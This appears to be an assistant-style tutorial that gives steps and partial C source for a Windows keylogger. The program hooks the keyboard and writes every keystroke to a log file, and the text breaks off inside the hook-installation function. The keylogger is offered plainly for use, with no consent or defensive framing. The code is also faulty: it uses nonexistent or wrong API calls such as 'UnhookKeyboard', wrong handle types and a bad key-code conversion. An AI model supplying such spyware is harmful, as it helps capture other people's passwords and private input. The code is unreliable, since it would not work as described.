To create a keystroke-logging application on a Windows computer, you can use a keyboard hook. Here's a step-by-step guide to write a simple keylogger that captures all keystrokes and logs them to a file:

### Step-by-Step Explanation:

1. **Include Necessary Libraries:**
   - Include the Windows header files needed for the Windows API functions.

2. **Define the Keystroke Structure:**
   - Create a structure to hold each keystroke, including the time and the key pressed.

3. **Set Up the Keyboard Hook:**
   - Use the `SetWindowsHook` function to install a keyboard hook that captures all key presses.

4. **Define the Callback Function:**
   - The callback function will handle each key press and call `GetKeyState` to determine if a key is pressed or released.

5. **Log Keystrokes:**
   - For each key event, check if a key is pressed or released and log the keystroke to a file.

6. **Handle File Operations:**
   - Open a file in append mode to log each keystroke and ensure error handling is in place.

7. **Terminate the Hook:**
   - Remove the keyboard hook and clean up resources when the program exits.

Here's the code:

```c
#include <Windows.h>
#include <stdio.h>

// Define the keystroke structure
typedef struct {
    long int time;
    char key;
    char modifier;
} KEYSTROKE;

// Define the file path for keystroke logging
#define KEYSTROKE_FILE "keystrokes.log"

// Function prototypes
void WriteKeystroke(KEYSTROKE* keystroke);
void HandleKeyboardEvent(UINT msg, WPARAM wParam, LPARAM lParam);
void UninstallKeyboardHook();

// Initialize the global keystroke file
FILE* keystrokeFile = NULL;

// Initialize the hook ID
ULONG_PTR hKeyboardHook = 0;

// Global variable to track if the hook is installed
bool isHookInstalled = false;

// Function to write keystrokes to file
void WriteKeystroke(KEYSTROKE* keystroke) {
    if (keystrokeFile) {
        fprintf(keystrokeFile, "%d, %c, %c\n", keystroke->time, keystroke->key, keystroke->modifier);
        fflush(keystrokeFile);
    }
}

// Handle keyboard events
void HandleKeyboardEvent(UINT msg, WPARAM wParam, LPARAM lParam) {
    KEYSTROKE keystroke;
    if (msg == WM_KEYDOWN) {
        // Check if the key is a modifier (Shift, Ctrl, Alt)
        if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU) {
            keystroke.modifier = 'M';
        } else {
            keystroke.modifier = ' ';
        }
        // Get the key pressed
        keystroke.key = wParam;
        // Record the time
        keystroke.time = GetTickCount();
        WriteKeystroke(&keystroke);
    }
}

// Uninstall the keyboard hook
void UninstallKeyboardHook() {
    if (isHookInstalled) {
        if (hKeyboardHook) {
            UnhookKeyboard(hKeyboardHook);
            hKeyboardHook = 0;
        }
        isHookInstalled = false;
    }
}

// Main function to set up the keyboard hook
void InstallKeyboardHook() {
    // Parameters for the hook
    HMODULE hMod = GetModuleHandle(NULL);
